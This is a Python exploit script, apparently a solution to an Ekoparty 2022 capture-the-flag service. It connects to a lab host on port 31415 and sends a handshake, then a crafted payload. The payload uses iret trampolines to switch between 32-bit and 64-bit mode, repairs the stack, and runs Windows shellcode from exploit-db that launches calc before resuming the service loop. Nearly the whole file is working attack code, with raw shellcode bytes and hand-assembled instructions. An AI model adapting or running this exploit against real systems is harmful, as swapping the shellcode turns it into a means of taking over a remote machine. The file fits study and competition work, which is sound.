import socket
import struct

host = "192.168.223.129"
#host = "127.0.0.1"
port = 31415

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

clientSocket.connect((host,port))

clientSocket.send(b"Hello\x00")

print(clientSocket.recv(1024))

clientSocket.send(b"Eko2022\x00T\xff\xff")

# WinExec calc shellcode 
# get from https://www.exploit-db.com/shellcodes/49819

sc = b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
sc += b"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
sc += b"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
sc += b"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
sc += b"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
sc += b"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
sc += b"\x48\x83\xec\x20\x41\xff\xd6"

code = [
    b"\x48\x81\xc4\x80\x01\x00\x00", # add rsp, 0x180
    b"\x48\x31\xff", # xor rdi, rdi
    b"\x48\x89\xf8", # mov rax, rdi
    b"\x65\x48\x8b\x58\x60", # mov rbx, gs:[rax+0x60] # ImageBaseAddress
    b"\x48\x8b\x5b\x10", # mov rbx, [rbx+0x10]
    b"\x48\x81\xc3\x66\x15\x00\x00", # add rbx, 0x1566 # Address inside the loop
    b"\x53", # push rbx
    b"\xc3", # ret
]
sc += b"".join(code) # for continue running

code = [
    b"\x31\xc0", # xor eax, eax
    b"\xb8\x2a\x00\x00\x00", # mov eax, 0x2a
    b"\x40", # inc eax
    b"\x50", # push eax ~> push 0x2b
    b"\x51", # push ecx
    b"\x68\x00\x02\x00\x00", # push 0x200
    b"\xb8\x32\x00\x00\x00", # mov eax, 0x32
    b"\x40", # inc eax
    b"\x50", # push eax ~> pust 0x33
    b"\x68\x00\x03\x00\x10", # push 0x10000300
    b"\xcf" # iretd
]
trampoline = b"".join(code)

code = [
    b"\x31\xc0", # xor eax, eax
    b"\xb8\x2a\x00\x00\x00", # mov eax, 0x2a
    b"\x40", # inc eax
    b"\x8e\xd0", # mov ss, eax
    b"\x81\xc1\x00\x0e\x00\x00", # add ecx, 0xe00
    b"\x89\xcc", # mov esp, ecx
]
fix_stack = b"".join(code)

payload = b""
payload += struct.pack("<I", 0x10000100) # ip
payload += struct.pack("<I", 0x23) # cs
payload += struct.pack("<I", 1<<9) # eflags
payload += struct.pack("<I", 0x10000f00) # esp
payload += struct.pack("<I", 0x53) # ss
payload += b"\x90"*(0x100-len(payload))
payload += fix_stack # fix ss and esp 
payload += trampoline # jump back to 64-bit mode with iret again
payload += b"\x90"*0x200
#payload += b"\xcc\xcc"
payload += sc
payload += b"\x90"*(0xf00-len(payload))
payload += b"X"*0x8

clientSocket.send(payload)

print(clientSocket.recv(4096))

